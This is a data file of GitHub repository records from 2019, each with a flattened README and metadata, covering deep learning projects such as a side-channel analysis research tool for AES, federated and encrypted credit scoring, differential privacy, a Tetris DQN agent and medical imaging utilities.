brisfors,DLSCA,n/a,DLSCA This repository is an open source tool for deep learning side channel attacks It is intended to be a GUI interface for some scripts used for research It was designed to be modular and you are free to change the code to suit your specific SCA needs The provided scripts were designed with 128 bit AES attacks on microcontrollers using an MLP neural net in mind It is not difficult to implement other functionality however such as attacking FPGA implementations of AES using other neural net architectures or attacking physical unclonable functions Some of this functionality may be added to the base version of the tool in the future The repository has been made public in conjunction with the publication of the technical report that introduces the tool The technical report can be found here https eprint iacr org 2019 1071 It contains an experiment that is intended to be easy to replicate yet non trivial To my knowledge this is the first published report about SCA utilizing deep learning on an electromagnetic side channel Electromagnetic SCA has been done in the past and deep learning SCA on power consumption has been done in the past but I have not found any EM DL SCA reports published prior to this The software has been tested for debian linux distros so the installation instructions may differ if you are running something else It also seems to work on Windows with conda installed Install instructions 1 install conda See instructions at https docs conda io projects conda en latest user guide install linux html 2 conda create n tensorflowenv python 3 6 3 conda activate tensorflowenv OR source activate tensorflowenv for older versions 4 conda install c conda forge tensorflow 1 12 0 necessity of older version being investigated 5 conda install keras 6 pip install fbs 7 conda install pyqt 8 conda install matplotlib 9 Clone this repository 10 That s it Just run python main py Usage instructions Conda is used to manage and compartmentalize execution environments The main reason it is recommended in the install instructions is that it helps prevent dependency errors It also removes a lot of the problems with differences between python 2 and python 3 so long as you remember to keep all python 2 libraries in one environment and all python 3 libraries in another The command 1 conda env list shows you all the environments on your system If you followed the install instructions then you should see tensorflowenv in that list In order to run the scripts you must have this environment be active The command to switch to the environment is 2 conda activate tensorflowenv Once you are in the right environment the way you run the script is you navigate to the install directory and run 3 python main py to start the program From here you can navigate the GUI and click the buttons to get info about what all fields and buttons do The program also supports command line arguments The following command 4 python main py path to file1 path to file2 path to fileN preloads file1 file2 fileN into the selected files In bash you can use wildcards to select a group of files 5 python main py ourModels MLP myModel would load all MLP models whose name start with myModel You can read more about bash wildcards if you want to know more advanced usages but here is an example of how it can be used 6 python main py ourModels MLP CWdiffEpochs 3 6 0 9 3 9 If you want to start in the utilities tab then call it with the flag u For example 7 python main py u history Running the following command displays usage information 8 python main py h If you are having trouble with running the program then there is a diagnostics script included You can run this either directly or by running the command 9 python main py d The diagnostic tool does not interact well with pipes so if you want to send diagnostics info to someone you should copy the output from the terminal window probably due to the fact that the script creates subprocesses which apparently do no automatically pipe their stdout to the same stdout as the python process that started them Licensce DLSCA a tool for Deep Learning Side Channel Analysis Copyright c 2019 Martin Brisfors Sebastian Forsmark Permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files the Software to deal in the Software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense and or sell copies of the Software and to permit persons to whom the Software is furnished to do so subject to the following conditions The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software THE SOFTWARE IS PROVIDED AS IS WITHOUT WARRANTY OF ANY KIND EXPRESS OR IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE,2019-07-09T07:33:04Z,2019-10-31T15:32:32Z,Python,brisfors,User,1,4,2,83,master,brisfors#SebastianForsmark#b10n,3,0,0,0,0,0,2
agrawal-rohit,stackoverflow-semantic-search,n/a,Team Maverick s entry for the IBM Hack Challenge Semantic Search for Stackoverflow Problem Statement Stack overflow provides one of the largest learning resources for programmers Users post questions doubts and his fellow peers try to provide solutions in the most helpful manner possible The better an answer the higher votes it gets which also increase a user s reputation However this huge amount of information makes it difficult to search for the solution you are looking for It is not that big of an issue for Domain experts and other experienced professionals because they are aware of the correct keywords required to get an appropriate answer However for a new programmer this poses a great concern For instance if he needs to learn how to make a server using Python it is quite unlikely that he would use the terms Django or Flask in the search box Thus this might intimidate the user to use the platform Proposed Solution The Application Architecture App Flow jupyterimgs appflow png The Brain The Brain jupyterimgs mainalgo png What we want is for the platform to actually understand the semantics of what the user is trying to search for and then return the most helpful results for him Natural Language Processing NLP has come a long way since its inception in the 20th century We decided to use this subfield of Artificial Intelligence in order to solve our problem NLP has proven to work very well in the past few years due to development of fast processors GPUs and sophisticated model architectures How to Install 1 Clone the repository using git clone https github com agrawal rohit stackoverflow semantic search git 2 In order to run the cells in the Jupyter notebooks you need have jupyter notebook installed in your python environment This is optional because the outputs have already been saved and included 3 Enter the folder flask server using cd stacksearch webapp flask server and run pip install r requirements txt from your python environment in order to install the required libraries 4 The server can now be started by entering the folder flask server and running python app py The server should be up and running on http 127 0 0 1 5000 5 Since the web interface has been written in ReactJS you need to install npm You can do so from this link https nodejs org en 6 Enter the react frontend folder using cd stacksearch webapp react frontend 7 Install the required modules using npm install 8 Finally you can start the web interface by running npm start The web interface should be up and running on http localhost 3000 Limitations and Future improvement Given the vast amount of data given on Stack overflow I decided to exercise a few constraints for the proof of concept 1 I have restricted the data to only Python Related Questions 2 I have restricted the possible tags to 500 3 I have used somewhat lower amounts of data points 140 000 for faster processing 4 Since this project is mostly just a proof of concept The web interface makes consecutive API calls to the server This is not optimal for a production environment and has only been added for visual aesthetic Further improvements may include Experiment to solve the problem using Topic Modelling or other sophisticated NLP tasks Consider larger number of data points Experiment with different architectures for the final classification network,2019-07-21T11:22:17Z,2019-09-25T07:42:57Z,Jupyter Notebook,agrawal-rohit,User,1,4,2,12,master,agrawal-rohit,1,0,0,1,0,2,0
AleksaC,nnlib,n/a,nnlib license https img shields io github license AleksaC nnlib svg maxAge 2592000 https github com AleksaC nnlib blob master LICENSE Build Status https travis ci com AleksaC nnlib svg branch master https travis ci com AleksaC nnlib Coverage Status https coveralls io repos github AleksaC nnlib badge svg branch master https coveralls io github AleksaC nnlib branch master You just found nnlib a minimalistic deep learning library built for educational purposes About Motivation Richard Feynman once said What I cannot create I do not understand and in general I agree with that statement especially when talking about programming So while I was learning deep learning I decided to implement some of the algorithms from scratch in numpy Since there were a lot of common things that could be shared between implementations of various algorithms I decided to use some of the code I ve written to create a small deep learning library with an interface similar to Keras Why call it nnlib It s a library for building neural nets hence nnlib Unfortunately naming things isn t something I m good at Note The library is in early alpha version and is undergoing major changes I ve been working on it for a long time with huge breaks so coding style and documentation are inconsistent and I ve only started writing tests recently I m doing my best to clean it up Installation The development of the library was done using Python 3 6 but it should work for python 3 4 or higher It is strongly recommended to use some sort of virtual environment I prefer plain old virtualenv but you can use pipenv conda environments or anything else you like To install the dependencies run python m pip install r requirements txt or simply python m pip install numpy as numpy is the only dependency of nnlib Using PyPI The library hasn t been published to PyPI yet so you need to install it from source From source commandline git clone https github com AleksaC nnlib git cd nnlib python m pip install If you want to make changes to the library it is best to use editable https pip pypa io en stable reference pipinstall editable installs install by running commandline python m pip install e That way all the changes to the code will immediately be reflected in the installed package Running tests To run test you need to have pytest installed To run tests with coverage you should install pytest cov and run pytest cov nnlib tests To run tests without coverage simpy run pytest while being in the root directory of the project Getting started To get a taste of nnlib take a look at this simple MLP that achieves 98 25 test accuracy on MNIST classification in around a minute of training on a machine with a decent CPU python from nnlib datasets import mnist from nnlib core import Model from nnlib layers core import FullyConnected from nnlib optimizers import SGD model Model FullyConnected 256 activation relu inputshape 784 weightinitializer henormal FullyConnected 128 activation relu weightinitializer henormal FullyConnected 10 weightinitializer xaviernormal loss softmaxcrossentropy optimizer SGD lr 4e 2 decay 2e 4 model summary model train mnist trainingdata flat True batchsize 64 epochs 10 model test mnist testdata flat True logginglevel 1 For more examples check out the examples folder https github com AleksaC nnlib tree master examples of this repo Contact If there s anything I can help you with you can find me at my personal website https aleksac me where you can contact me directly or via social media linked there If you liked this project you can follow me on twitter to stay up to date with my latest projects,2019-07-04T18:01:53Z,2019-09-16T08:46:41Z,Python,AleksaC,User,1,4,1,20,master,AleksaC,1,0,0,0,0,0,0
mkucz95,encrypted_ai_finance,deep-learning#differential-privacy#federated-learning#pysyft#pytorch#secure-multi-party-computation,Credit Approval Application Private Encrypted AI Federated Encrypted Deep Learning Project Description This project is an experiment in differential privacy and federated learning as privacy preserving techniques for deep learning Privacy has recently been at the forefront of news cycles with Facebook and other tech giants specifically under scrutiny The idea behind encrypted deep learning is simple preserve people s privacy while aligorithms enabling machine learning models to be developed on this data The project goal is to show encrypted deep learning in a realistic use case credit applications Some of the most significant data breaches in recent years have originated at the hands of the financial industry More specifically the credit sector especially Equifax have showed both that they are high profile targets for entities with malicious intent and that their data protection techniques are lacking at best It would be an improvement over the current system if a user was able to encrypt their databefore passing it into a model that either approves or rejects the individuals application for a new line of credit This would also serve to simplify the data protection measures currently necessary for companies providing credit related services Credit providers could make their encrypted models public or license them to other firms without fearing a breach of intellectual property The firms licensing the model would be able to use it without knowing the parameters of said model Privacy preservation in machine learning is built upon Differential Privacy https htmlpreview github io https github com mkucz95 privateaifinance blob master notebooks differential privacy html and the cryptography techniques used in this project includes Secure Multi Party Computation SMPC https htmlpreview github io https github com mkucz95 privateaifinance blob master notebooks securemultipartycomputation html Note This project was inspired by lectures of Andrew Trask https iamtrask github io in the Private AI Scholarship Challenge on Udacity https www udacity com facebook AI scholarship Furthermore segments of the code are inspired by the PySyft tutorials on GitHub https github com OpenMined PySyft tree dev examples tutorials an excellent resource for people starting off with Private AI Layout I have put together a series of Jupyter Notebooks that show how I have worked through first federated learning and later encrypted deep learning and put those together into a model that can hand credit scores in an encryted and federated manner This is accompanied by notebooks explaining Differential Privacy https htmlpreview github io https github com mkucz95 privateaifinance blob master notebooks differential privacy html and Secure Multi Party Computation SMPC https htmlpreview github io https github com mkucz95 privateaifinance blob master notebooks securemultipartycomputation html both for those who are unfamiliar with the subject but also for myself since I learn best by explaining to others The second party of the project is code that can be run from the command line and uses websockets on a variety of locally hosted servers to mimic a real world federated learning setup data data and model storage notebooks nn dev ipynb initial NN dev 3 layer network federateddl ipynb training model on remote workers federateddlmodelaveraging ipynb training numerous models across all workers encrypteddl ipynb fully encrypted NN securemultipartycomputation ipynb my explanation of and notes on SMPC differential privacy ipynb my understanding of DP websocketproject runwebsocketclient py starts single remote client worker on localhost port runwebsocketserver py create websocket server to manage training startwebsocketservers py create remote client workers by calling runwebsocketclient Data I am using a publically available data set for the purpose of this example The data set contains 15 anonymixed features for privacy protection and a binary label I have created fake names and features to illustrate how privacy protection would work in reality The current anonymization of the dataset is unlikely to have fully preserved privacy Without practicing proper differential privacy it is widely know that most anonymized datasets can be reverse engineered or at the very least that not all anonymity is preserved The data comes courtesy of UC Irvine Machine Learning Repository https archive ics uci edu ml datasets Credit Approval Project Steps Neural Network Development notebook https htmlpreview github io https github com mkucz95 privateaifinance blob master notebooks nn dev html Data processing to mimic gathering data across many people In reality we would never want data to leave the ownership of any individual Even better we would want to make sure that not only does the data stay on the devices of these individuals but also that computations are performed on encrypted data to preserve the maximum amount of privacy possible Here I develop as simple 3 layer fully connected neural network and train it on a training set to save time for future notebooks This way it is also simpler to prove that this is a solvable problem but this step is not private at all Federated Deep Learning notebook https htmlpreview github io https github com mkucz95 privateaifinance blob master notebooks federateddl html Here we train a model on remote data by sending the model to each of these remote workers We then recieve back an updated version of this model This is does not yet protect privacy to the extent that we would like It is entirely possible to deduce information about a specific individual based on the gradients and updated weights of the model that is returned Federated Deep Learning with Model Averaging notebook https htmlpreview github io https github com mkucz95 privateaifinance blob master notebooks federateddlmodelaveraging html To build on the previous step here we rely on a trusted third party aggregator to add privacy in the training process Each remote worker has a copy of the original model train their own versions of the model before sending the weights and biases of each of these models to be averaged using a simple average This results in a final model that is trained across all the data but with weights and biases and change thereof which cannot be attributed to a single worker However the downside of this approach even though it is still rather computationally efficient is that it relies on trusting a third party which is not always wise Encrypted Deep Learning notebook https htmlpreview github io https github com mkucz95 privateaifinance blob master notebooks encrypteddl html Encrypted deep learning uses fundementals of Secure Multi Party Computation to remove the need of any third party trust while retaining high degrees of privacy This is the most computationally intensive but also privacy preserving of the methods I have implemented The tough thing with encrypted deep learning is that we also have to encode all numbers into fixed precision which limits us in the loss function and predictive calculations we can make while also decreasing the accuracy of the network Federation with WebsocketServerWorkers project https github com mkucz95 privateaifinance tree master websocketproject capstone project A simulation of a realistic situation where there are remote client workers running on different localhost ports with data split amongst them The training is performed using websockets across these workers This is the closest to a real implementation of this code Check out the write up and code for this here https github com mkucz95 privateaifinance tree master websocketproject capstone project Warning This code still has bugs Conclusion Even though the training of an encrypted neural network is more nuanced than an unencrypted one at a minimum one can encrypt a network make predictions using this network on encrypted data preserving privacy Furthermore an extension to this is to apply the softmax activation function AFTER all the other computation is done at least when testing or getting predictions which could give a more accurate indication into the performance of the neural network Even in the scenario where all data and computation is encrypted it does not prevent an adversarial attack where shares are intentionally corrupted during computation This is generally considered an open problem in SMPC and encrypted deep learning A look at the results of the network on the testing set indicates that while performance did suffer slightly from the unencrypted model could be largely due to the fixed precision encoding of all gradients and data the performance is largely in line with that of the non private model Even though it does not have 100 accuracy a case could be made for the fact that the labels from the original data could be wrong in the sense that certain people may have been accepted for credit when they shouldn t have been This is a problem with the underlying dataset which would be fixed by labeling the data based on who repaid their credit and who didn t Differential Privacy for Deep Learning Differential privacy techniques provide certain guarantees for privacy in the context of deep learning Instead of encrypting data we add noise to the data local DP or to the output of a query global DP such that privacy is preserved to an acceptable degree To familiarize yourself with Differential Privacy visit a short guide I have put together here https htmlpreview github io https github com mkucz95 privateaifinance blob master notebooks differential privacy html For the purpose of this example however I have not implemented differential privacy since data will be encrypted end to end anyway However one could have private deep learning employing differential privacy on a local or global level and then work with unencrypted data gradients and models Generally one could preserve privacy very succesfully in the federated learning approach by utilizing local differential privacy adding noise to the data before training each model This would preserve privacy although not as well as full encryption towards both a trusted third party aggregator or directly to those training the network Future Development adding differential privacy preserving techniques such as local differential privacy training data in fully federated and encrypted mode websocket based training as a realistic scenario for federated learning with raspberry pies as bonus Finally Please checkout out the OpenMined PySyft code https github com OpenMined PySyft This code base is built on contributions from amazing people and always looks to expand How to Run This Code 1 clone the repository 2 create and run a virtual environment https packaging python org guides installing using pip and virtual environments 3 install dependencies in this new environment pip install r requirements txt 4 You re ready to go,2019-08-04T04:34:31Z,2019-10-19T09:35:24Z,HTML,mkucz95,User,1,4,0,21,master,mkucz95,1,0,0,2,2,2,0
loaiabdalslam,AUL,auto-ml#automated#automated-machine-learning#brain-js#deep-learning#machine-learning#tensorflow,Automated Neural Network Nowadays machine learning techniques and algorithms are employed in almost every application domain e g financial applications advertising recommendation systems user behavior analytics In practice they are playing a crucial role in harnessing the power of massive amounts of data which we are currently producing every day in our digital world In general the process of building a high quality machine learning model is an iterative complex and time consuming process that involves trying different algorithms and techniques in addition to having a good experience with effectively tuning their hyper parameters In particular conducting this process efficiently requires solid knowledge and experience with the various techniques that can be employed With the continuous and vast increase of the amount of data in our digital world it has been acknowledged that the number of knowledgeable data scientists can not scale to address these challenges Thus there was a crucial need for automating the process of building good machine learning models In the last few years several techniques and frameworks have been introduced to tackle the challenge of automating the process of Combined Algorithm Selection and Hyper parameter tuning CASH in the machine learning domain The main aim of these techniques is to reduce the role of human in the loop and fill the gap for non expert machine learning users by playing the role of the domain expert Getting Started These instructions will get you a copy of the project up and running on your local machine for development and testing purposes See deployment for notes on how to deploy the project on a live system Prerequisites What things you need to install the software and how to install them Give examples Installing A step by step series of examples that tell you how to get a development env running Say what the step will be npm install And repeat until finished End with an example of getting some data out of the system or using it for a little demo Running the tests Explain how to run the automated tests for this system Break down into end to end tests Explain what these tests test and why npm test And coding style tests Explain what these tests test and why Give an example Deployment Add additional notes about how to deploy this on a live system Built With tensorflow js brain js mocha unittest Contributing Please read CONTRIBUTING md for details on our code of conduct and the process for submitting pull requests to us Versioning 0 0 0 Authors Loai abdalslam Initial work Loai abdalslam https github com loaiabdalslam See also the list of contributors https github com loaiabdalslam ANN js contributors who participated in this project License This project is licensed under the MIT License see the LICENSE md LICENSE md file for details Acknowledgments Read more about automated machine learning https github com hibayesian awesome automl papers Automated Machine Learning Topic https www google com search q automated machine learing papers oq automated machine learing papers aqs chrome 69i57j0l5 5021j0j9 sourceid chrome ie UTF 8,2019-07-31T22:02:03Z,2019-10-17T02:33:18Z,JavaScript,loaiabdalslam,User,1,4,1,14,master,loaiabdalslam,1,0,0,0,0,0,3
ChesterHuynh,tetrisAI,n/a,Tetris AI Implemented a Deep Q learning Network to teach an agent how to play Tetris The Q learning algorithm is a reinforcement learning algorithm that uses the general concept of providing the agent rewards when it achieves what we want it to achieve and punishments otherwise For the sake of keeping the animation short here is the gameplay footage of roughly the first 50 000 points of the AI Demo First 10000 points demo gif This project was done solely in Python I created an interactive version of the game that utilizes the PyGame package as well as the AI version that utilizes the Keras framework and TensorFlow backend See how you stack up against the AI You can run the AI version by running python main py in command line to begin training the agent Getting Started and Implementation Interactive Version I implemented an interactive version of tetris using Pygame to better understand the game mechanics in tetris py You can run python runinteractive py in command line to begin an interactive game The score for the interactive game is updated according to the following rule after each piece is placed score level 2 1 1 10 rowscleared 2 and the game speed increases as the level increases The player starts at level 0 and proceeds to subsequent levels after clearing 12 lines Looking more closely at the update rule the player gets 1 point times the level multiplier level 2 1 When clearing lines the player receives points equal to boardwidth times rowscleared squared times the level multiplier The data structure of choice to represent the pieces were rectangular 2D lists which has zeros for elements in the list that should be colored the same as the background and nonzero values that follow the shape of the piece To keep majority of the code algorithmic I only store one orientation of each block and algorithmically applied rotations and joins of pieces As a result in the display you might see a delay in the rendering of certain colored squares when rectangular arrays overlap and the values in the arrays must be updated AI Version For the AI a Deep Q Learning Network DQN is implemented aiming for a goal score of 5 000 points The AI doesn t have levels so the score is updated according to the following rule after each piece is placed score 1 10 rowscleared 2 similar to the interactive version s score update rule The data structure used to represent the pieces follow similarly to the interactive version as well The ANN used to construct the DQN is a Sequential model with two hidden layers each with 32 neurons The activations for each of the hidden layers are ReLU s and the activation for the last layer is Linear The loss function used was mean squared error for our optimizer Adam The inputs to the ANN are a vector of features about the game s current state of the board After looking at 6 in my helpful links the most important features about the current state that helped the ANN train better were the following linescleared the number of lines cleared after a certain piece was placed holes the number of holes in the board entries that are 0 but have nonzero values above totalbumpiness the sum of the differences in heights of adjacent columns sumheight the sum of the heights of each column The ANN would try out all possible next states of a given piece since it was given a dictionary of all possible configurations and columns that a given piece could be placed in and the associated vector of state features Since we do not have a state action table to look up the q values for a given state action pair we use the ANN to predict the q value of the state action information and choose the best action based on the prediction made by the ANN The hyperparameters that had to be tuned for the DQN were as follows discount how strongly to consider future rewards over immediate ones 0 98 is used replaymemsize number of tuples stored in the ANN s memory 20000 is used minibatchsize how large the random sample from the replaymemory the ANN should use to train over 512 is used epsilonstopepisode epsiode number when we reduce the exploration probability epsilon to epsilonmin epsilon is set to 1 epsilonmin is set to 0 and epsilonstopepisode is set to 75 of episodes learningrate learning rate for our optimizer Adam 0 005 is used hiddendims number of hidden layers and the number of neurons in each layer 64 64 is used You can run python main py in command line to begin training the network Once trained go into models and select the model with the highest score and copy it to the project root folder naming it bestmodel h5 Then run python demo py to record your bestmodel playing another game You can review the results in TensorBoard by running tensorboard logdir log and you can look at the average score of every 50 iterations max score of every 50 iterations and min score of every 50 iterations over the course of training by opening up a browser and accessing localhost 6006 Here are the results from the training session from which I selected my bestmodel h5 Alt text tensorboardplots svg We see that the average and max scores skyrocket once epsilon has decayed to 0 however consistently across many runs after around episode 1800 the performance drops considerably possibly due to overfitting of the ANN This may be avoidable if a targetmodel ANN were constructed and the agent was trained for longer but due to each run already taking a considerably long time I decided not to pursue this avenue The min scores however continually hovers around the 10 30 s range indicating that in every batch of 50 episodes the agent has at least one run where it hardly cleared any lines before hitting game over Background Vanilla Q learning Algorithm Specifically the Q learning algorithm seeks to learn a policy that maximizes the total reward by interacting with the environment as well as constructing and updating a state action table that lists all possible actions that can be taken in each possible state of the game The table has the shape numstates numactions and each entry stores quality values aka Q values which get updated as an action is committed by the agent For a given state that the agent is in the agent chooses an action either by exploring a random action or exploiting information from our table and selecting the action with the highest q value We control how the agent decides on its next action by tweaking the probability of taking a random action epsilon which is between 0 and 1 Often you want to let the agent explore random actions when starting from scratch keeping epsilon close to or equal to 1 and gradually decay to epsilonmin usually 0 01 or 0 Updates on the q values in the state action table occur after each action and ends when an episode is completed in this case when a game over occurs After each action is taken by the agent the agent interacts with the environment and the environment returns a reward in response to the action The update rule is as follows Q state action Q state action lr reward discount np max Q newstate Q state action where lr is the learning rate controls how much the q value is affected by the results of the most recent action i e how much you accept the new value vs the old value discount is the discount factor which is a value between 0 and 1 that controls how strongly the agent considers future values over immediate values From our update rule we see that the future reward is multiplied our variable discount Typically discount is between 0 8 and 0 99 reward is the value returned the environment in response to the agent taking an action Deep Q Learning Networks DQN For environments with very large or infinitely large number of possible states and or actions using a table can be computationally expensive Instead we approximate the q values that would be in a state action table with an artificial neural network ANN or convolutional neural network CNN In this project an ANN was used over a CNN since CNN s are better suited when the input data that must have its spatial temporal ordering preserved e g images or audio clips To guarantee stability during training and preventing correlation between steps in a given episode we construct two ANN s one that is the Q network and one that is the target network To get q values to update properly in Q network we need something to serve as the validation data for our algorithm to optimize over The target network serves this purpose When the Q network is training and updating its weights to output q values for each possible action given various features about the state of the environment after every updatetargetevery number of episodes the weights of the Q network are copied and frozen into the target network for the next updatetargetevery number of episodes and is used to generate our validation data For DQN s we generally optimize this by minimizing mean squared error and update the target model every 5 10 games In addition the Q network also has a experience replay which in this project is a deque of size memorysize and has entries of the form where s is the current state s is the new state a is the action taken to get from s to s and r is the reward from the environment in response to the action taken While training to provide greater stability in how the agent learns the agent randomly samples from its experience replay using old and new experiences alike Helpful Links Here are some helpful links that I used to build better understand Q learning and DQN s as well as helped me with the implementation The last three are pretty mathematically technical whereas the first three help with implementation 1 Sentdex s Reinforcement YouTube Series https www youtube com watch v yMkXtIEzH8 2 Article on the q learning algorithm https towardsdatascience com simple reinforcement learning q learning fcddc4b6fe56 3 Article on the DQN framework https towardsdatascience com self learning ai agents part ii deep q learning b5ac60c3f47 4 More math on DQN s https towardsdatascience com dqn part 1 vanilla deep q networks 6eb4a00febfb 5 DeepMind s Deep RL DQN Paper https storage googleapis com deepmind media dqn DQNNaturePaper pdf 6 Paper on CS231n Tetris AI Project http cs231n stanford edu reports 2016 pdfs 121Report pdf,2019-07-25T20:50:26Z,2019-08-27T00:27:53Z,Python,ChesterHuynh,User,0,4,0,55,master,ChesterHuynh,1,0,0,1,0,2,0
ateniolatobi,Differential-privacy-for-deeplearning-project,n/a,PROJECT DIFFERENTIAL PRIVACY FOR DEEP LEARNING ON THE MNIST DIGIT DATASET ABSTRACT Differential privacy is a system for publicly sharing information about a dataset by describing the patterns of groups within the dataset while withholding information about individuals in the dataset Another way to describe differential privacy is as a constraint on the algorithms used to publish aggregate information about a statistical database which limits the disclosure of private information of records whose information is in the database For example differentially private algorithms are used by some government agencies to publish demographic information or other statistical aggregates while ensuring confidentiality of survey responses and by companies to collect information about user behavior while controlling what is visible even to internal analysts Roughly an algorithm is differentially private if an observer seeing its output cannot tell if a particular individual s information was used in the computation Differential privacy is often discussed in the context of identifying individuals whose information may be in a database Although it does not directly refer to identification and reidentification attacks differentially private algorithms probably resist such attacks Visualization of Differential Privacy PROJECT DESCRIPTION Differential privacy in Deep learning is the process where the concept of Differential Privacy is applied in Deep Learning models The application of differential privacy in deep learning ensures that Deep learning models are created which are accurate and at the same time conserves user privacy Differential privacy preserves privacy by introducing distortion or randomness into the data in a dataset Local differential privacy or in the output of a query Global Differential privacy in order to ensure that the dataset or the output of a query on the dataset are distorted enough to ensure that the output of a query varies slightly from the actual output hence protecting privacy and at the same time being accurate enough to represent the general trend in the dataset for any statistical analysis on the dataset Global Differential privacy in Deep learning involves the use of teacher models trained on unique datasets to evaluate an unlabelled dataset which would be used to train the differentially private model In this project Global differential privacy would be used Global Differential privacy in Deep learning involves the use of teacher models trained on unique datasets to evaluate an unlabelled dataset which would be used to train the differentially private model The labels generated by the teacher models would be evaluated through a mechanism known as PATE analysis which returns a result that indicates the trade off between privacy and accuracy by the teacher models The number of teacher models and the training epoch of the teacher models would be varied until a reasonable result is gotten after performing PATE analysis The various labels generated for each data in the unlabelled dataset by the teacher models would then be randomized slightly by applying Laplacian noise ensuring that few data entries in the dataset would be purposely mislabeled to conserve privacy The now labeled dataset would be used to create and train a model that would be differentially private Tools Used The model was created and trained with PyTorch and the MNIST digit dataset was used to train the models torch 1 1 0 torchsummary 1 5 1 torchtext 0 3 1 torchvision 0 3 0 syft 0 1 29a1 numpy 1 16 4 matplotlib 3 0 3 pip install torch pip install syft pip install pandas pip install numpy pip install matplotlib References 1 Understanding Differential Privacy https towardsdatascience com understanding differential privacy 85ce191e198a 2 Secure and Private AI course Udacity https www udacity com course secure and private ai ud185 3 Martn Abadi Andy Chu Ian Goodfellow H Brendan McMahan Ilya Mironov Kunal Talwar Li Zhang 2012 Deep Learning with Differential Privacy https arxiv org abs 1607 00133,2019-07-14T15:17:55Z,2019-12-13T17:40:43Z,Jupyter Notebook,ateniolatobi,User,0,4,1,6,master,ateniolatobi,1,0,0,0,0,0,0
brianmanderson,Dicom_Data_to_Numpy_Arrays,n/a,If you find this code useful please provide a reference to my github page for others www github com brianmanderson thank you This code feeds into https github com brianmanderson MakeSingleImages This is for the creation of numpy arrays from dicom images and RT structures for deep learning purposes The DicomImagesintoDataParallel should be able to create numpy arrays with a training test validation split You will need to define the contour names that you want to create from DicomImagesintoDataParallel import main ContourNames liver path serverlocationLiverPatientsPatientImages Where the location above has folders with patient images The RT structures and images must be in the same folder outpath serverlocationLiverPatientsNumpyArrays imagesdescription MyLiverImages associations liverbmaprogram liver argmax True If structures do not overlap allows annotations to be viewed in vv main imagepath path outpath outpath imagesdescription imagesdescription ContourNames ContourNames associations assocations argmax argmax The output should be serverlocationLiverPatientsNumpyArraysMyLiverImages TrainTestValidation,2019-07-25T23:01:47Z,2019-10-24T18:32:28Z,Python,brianmanderson,User,0,4,0,35,master,brianmanderson,1,0,0,0,0,0,0
fepegar,miccai-educational-challenge-2019,cnn#convolutional-neural-networks#image-segmentation#medical-image-processing#medical-imaging#miccai#niftynet#pytorch#resnet#tensorflow#tensorflow-tutorials#tutorial,This is my submission to the MICCAI Educational Challenge 2019 https miccai sb github io challenge html You can run the notebook on Google Colab https colab research google com github fepegar miccai educational challenge 2019 blob master CombiningthepowerofPyTorchandNiftyNet ipynb or render an already executed version on nbviewer https nbviewer jupyter org github fepegar miccai educational challenge 2019 blob master CombiningthepowerofPyTorchandNiftyNet ipynb flushcache true a href https colab research google com drive 1vqDojKuC4Svb97LdoEyZQygm3jccX4hr target parent img align left src https colab research google com assets colab badge svg a href https nbviewer jupyter org github fepegar miccai educational challenge 2019 blob master CombiningthepowerofPyTorchandNiftyNet ipynb flushcache true target parent img align right src https raw githubusercontent com jupyter design master logos Badges nbviewerbadge png width 109 height 20 Combining the power of PyTorch and NiftyNet NiftyNet is an open source convolutional neural networks platform for medical image analysis and image guided therapy https niftynet io built on top of TensorFlow https www tensorflow org Due to its available implementations of successful architectures patch based sampling and straightforward configuration it has become a popular choice https github com NifTK NiftyNet network members to get started with deep learning in medical imaging PyTorch is an open source deep learning platform that provides a seamless path from research prototyping to production deployment https pytorch org It is low level enough to offer a lot of control over what is going on under the hood during training and its dynamic computational graph https medium com intuitionmachine pytorch dynamic computational graphs and modular deep learning 7e7f89f18d1 allows for easy debugging Being a generic deep learning framework it is not tailored to the needs of the medical imaging field although its popularity in this field is increasing rapidly One can extend a NiftyNet application https niftynet readthedocs io en dev extendingapp html but it is not straightforward without being familiar with the framework and fluent in TensorFlow 1 X Therefore it can be convenient to implement applications in PyTorch using NiftyNet models and functionalities In particular combining both frameworks allows for fast architecture experimentation and transfer learning So why not use both https www youtube com watch v vqgSO8cRio feature youtu be t 5 In this tutorial we will port the parameters of a model trained on NiftyNet to a PyTorch model and compare the results of running an inference using both frameworks,2019-07-24T10:43:33Z,2019-11-21T07:44:04Z,Jupyter Notebook,fepegar,User,0,4,0,43,master,fepegar,1,4,4,1,0,0,0
p0werHu,LieNet,n/a,LieNet Introduction This is the pytorch version of LieNet which is from the paper Zhiwu Huang Chengde Wan Thomas Probst Luc Van Gool Deep Learning on Lie Groups for Skeleton based Action Recognition In Proc CVPR 2017 The original code written by Matlab is provided here https github com zzhiwu LieNet Usage step 1 download g3d data from http www vision ee ethz ch zzhiwu and save them in g3d folder step 2 run prediction py in any IDE BTW The code is very simplified with some functions not implemented like load trained model etc I will implement them in the future,2019-06-28T08:43:09Z,2019-10-22T03:29:57Z,Python,p0werHu,User,1,4,1,30,master,p0werHu,1,0,0,0,1,0,0
whatwilliam,modelsfromscratch,n/a,modelsfromscratch I m showing how to create past models like VGG ResNet DenseNet Inception etc from scratch to help others learning about deep learning through Tensorflow and Tensorflow datasets It s best if you follow along with the original papers for the models VGG https arxiv org abs 1409 1556 ResNet https arxiv org abs 1512 03385 Inception https arxiv org abs 1409 4842 DenseNet https arxiv org abs 1608 06993 Inception v4 https arxiv org abs 1602 07261 ResNeXt https arxiv org abs 1611 05431,2019-08-04T17:32:28Z,2019-11-05T19:02:04Z,Jupyter Notebook,whatwilliam,User,1,4,0,23,master,whatwilliam,1,0,0,0,0,0,0
